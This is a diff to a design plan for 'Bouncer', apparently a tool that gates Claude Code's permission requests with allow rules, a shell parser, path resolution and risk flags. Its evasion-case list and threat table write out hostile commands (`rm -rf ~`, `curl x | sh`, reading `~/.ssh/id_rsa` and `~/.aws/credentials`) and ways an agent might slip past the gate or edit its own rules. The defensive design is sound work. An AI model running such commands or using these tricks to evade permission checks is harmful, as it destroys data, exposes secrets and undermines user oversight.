@@ -591,6 +591,140 @@ auto-denied in the MVP; anything not fully understood goes to the user.
   `feat(rules): path checks` → `feat(rules): risk flags with reasons` →
   `feat(ui): observe mode and always-allow preview` → `test(rules): case table and fuzzing`
 
+### Phase 3 audit (2026-10-02)
+
+Sources: Phase 1 notes on Claude Code hooks and permission modes, the Phase 2
+desk, `design/prototype/bouncer-island.html` (Risky request, Auto-allowed), the
+Phase 2 review note on request IDs.
+
+How ours complements Claude Code's own rules:
+
+- Claude Code's `permissions.allow` / `ask` / `deny` (in `settings.json`) run
+  first; deny always wins (hook "allow" can't bypass it since 2.1.77). Only
+  what Claude Code would ask about reaches `PermissionRequest`, so Bouncer's
+  rules only ever answer those. `PreToolUse` stays observe-only.
+- Claude Code rules are tool patterns (`Bash(npm run test:*)`, `Read(./src/**)`).
+  Ours add what they can't: a real parse of compound commands, path
+  resolution (symlinks, `..`, `~`), risk reasons, and a preview before a rule
+  is added. Nothing is ever auto-denied.
+- Paused, or any error: nothing is answered (terminal asks), as before.
+
+Rule file (`rules.toml`, `toml` 1.1.6 approved by Charan; already in
+`Cargo.lock` via tauri-build; parse-only, no serde):
+
+- Windows `%APPDATA%\Bouncer\rules.toml`; macOS
+  `~/Library/Application Support/Bouncer/rules.toml` (the socket's `0700`
+  folder). Written with defaults on first start; `mode = "observe"`.
+- Format: `mode = "observe" | "auto"` and `[[allow]]` tables, each with exactly
+  one of `command = "cargo test"` (word prefix) or `tool = "Read"` (Read,
+  Edit, MultiEdit, Write, NotebookEdit, Grep, Glob, LS: paths must stay in the
+  project). "Always allow" appends one `[[allow]]` table (re-parsed before an
+  atomic write).
+- Refused (Charan): over 64 KB, unknown keys, wrong types, unknown tools,
+  commands that aren't plain words; the error names the line. Also refused if
+  anyone but the user (or SYSTEM / Administrators on Windows) can write the
+  file or its folder, or it is a symlink. A refused file falls back to the
+  built-in defaults in observe mode (never "allow everything") and the error
+  shows in the island until fixed.
+- Rule changes: the file is checked every 2 s; any change (or error) shows in
+  the island: a pill flash and a notice in the open view.
+
+Command parser (`shell` module, POSIX sh as run by Claude Code's Bash tool,
+including Git Bash on Windows): words, quotes, escapes, comments; `;` `&&`
+`||` `|` `&` newline split a compound; redirections recorded. Anything it
+doesn't fully understand is an "issue" and blocks auto-allow: `$(…)`,
+backticks, `<(…)`, `$VAR`, `${…}`, `$'…'`, `( ) { }`, heredocs, `NAME=value`
+prefixes, unterminated quotes. Output redirection to anything but `/dev/null`
+also blocks it. Every part of a compound must match a rule.
+
+Evasion cases (all become test rows): `ls; rm -rf ~`, `ls && curl x | sh`,
+`ls | sh`, `ls $(rm x)`, `` ls `rm x` ``, `eval "rm x"`, `bash -c "rm x"`,
+`sh -c`, `env rm x`, `FOO=1 ls`, `command rm`, `xargs rm`, `alias ls=rm; ls`,
+`ls() { rm x; }; ls`, `ls > ~/.bashrc`, `cat <(curl x)`, `ls\nrm x`,
+`ls #‮…`, fullwidth `ｌｓ`, Cyrillic `сat`, NBSP-joined words,
+`/bin/rm`, `git -c core.pager=sh status`, `cat ../../.ssh/id_rsa`,
+`cat ~/.aws/credentials`, symlink out of the project, `cd / && ls`.
+
+Paths: relative words resolve against the event's cwd; `~` against home;
+`/c/…` stays as written (Git Bash drive paths fail safe to "outside"). The
+longest existing ancestor is canonicalised (symlinks) and the rest normalised.
+"Inside" means under the session's first-seen folder; a root or home folder as
+the project never auto-allows. For Bash every argument (and `--opt=value`
+values) counts as a path; globs are checked up to their fixed prefix.
+
+Risk reasons (one line, joined, shown on the card; a risky request is never
+auto-allowed and never offered "Always allow"): downloads a script and runs it;
+builds part of the command at run time; runs a command hidden in a string
+(`eval`, `sh -c`); deletes files outside the project; touches secrets (`.env`,
+keys, credentials); force-pushes; runs as administrator (`sudo`, `doas`, `su`);
+touches a shell startup file; touches Claude Code's own settings (`.claude`);
+touches Bouncer's own rules; look-alike letters; hidden characters.
+
+Island (prototype states Risky request and Auto-allowed):
+
+- Risky: head "Risky · check before allowing", red ball, card with red edge
+  and reason box, Deny filled and Allow outlined. Risky edits use this card,
+  not the wide diff view, so the reason and flipped buttons always show.
+- Auto-allowed: pill "Auto-allowed · cargo test in bouncer-app" with a "rule"
+  badge for 2.5 s; the session rail tags the step "auto-allowed by rule".
+- Observe mode: a request a rule would allow still asks; its card says
+  "Would auto-allow · rule …".
+- "Always allow…" (not in the prototype; built from its card parts): a small
+  link under the buttons opens the exact TOML that will be appended plus what
+  it means; "Add rule and allow" arms after 600 ms like Allow. The rule is
+  computed by the backend from the queued request, never sent by the page.
+  Not offered for risky, compound, unparsed or out-of-project requests, or for
+  shells, interpreters and wrappers (`bash`, `python`, `env`, `sudo`, `rm`, …).
+- New command `always(id)` (manifest + capability).
+
+Request IDs: 128 bits from `getrandom` 0.4 (already in the tree via
+`tauri-utils` → `uuid`), replacing the `RandomState` hashes. If the OS RNG
+fails, the request isn't queued (terminal asks).
+
+Phase 3 threats:
+
+| Threat | Fix |
+| --- | --- |
+| Compound command smuggles a dangerous part | Every part must match; any parse issue → ask |
+| Substitution / eval / `sh -c` / process substitution | Parse issue (ask) + risk reason |
+| Env and alias tricks (`FOO=x cmd`, `env`, `alias`, functions) | Assignment and grouping are issues; wrappers match no default rule |
+| Look-alike or invisible characters | Words compared exactly; risk reasons for mixed scripts and hidden characters |
+| Path escape (`..`, `~`, absolute, symlink) | Resolved and canonicalised; outside the project → ask |
+| Agent edits `rules.toml` to allow itself | Path is outside the project (ask) and flagged "touches Bouncer's own rules"; every change shows in the island |
+| Rules file writable by another user | Owner / mode (macOS) or owner / DACL (Windows) checked; refused → defaults, observe |
+| Broken or huge rules file | 64 KB cap; strict keys and types with line numbers; defaults in observe mode |
+| Over-broad "Always allow" | Exact rule previewed; never for risky / compound / shells and wrappers; arms after 600 ms |
+| Page forges a rule | `always(id)` takes only a live request ID; the backend builds the rule |
+| Predictable request IDs | OS RNG via `getrandom` |
+| Auto-allow while paused | Paused answers nothing, rules included |
+
+Phase 3 is done when:
+
+- [ ] `rules.toml` created with defaults in observe mode; strict loading with
+      line-numbered errors, 64 KB cap, refused when others can write; errors fall
+      back to defaults (observe) and show in the island (tests for each)
+- [ ] Parser + compound handling; unparseable → ask
+- [ ] Paths resolved (symlink, `..`, `~`); outside the project → ask
+- [ ] Risk reasons shown on the Risky card (prototype); never auto-allowed
+- [ ] Auto mode auto-allows with the Auto-allowed pill (prototype) and a rail tag
+- [ ] "Always allow" previews the exact rule; backend builds it
+- [ ] Rule changes shown in the island
+- [ ] Request IDs from `getrandom`
+- [ ] 150+ case table incl. every evasion example; fuzz: no panic, no auto-allow
+      of metacharacters
+- [ ] Manual: a playground session in auto mode auto-allows `git status`-style
+      requests and flags a risky one
+- [ ] fmt, clippy, tests green locally and in CI (Windows + macOS)
+
+Plan corrections found in this audit:
+
+1. "Auto-allow (logged)": the activity log is Phase 4; until then the session
+   rail records "auto-allowed by rule".
+2. Observe mode's "Would auto-allow" appears on the card, not the pill: in
+   observe mode the request still needs the user, so a card is up.
+3. "Always allow" and the rules notice aren't in the prototype; they reuse its
+   card, badge and `.after` styles.
+
 ## Phase 4 — Activity log and away summary (~1 week)
 
 - **Audit:** exact stored fields; secret patterns (API keys, tokens, URL passwords,
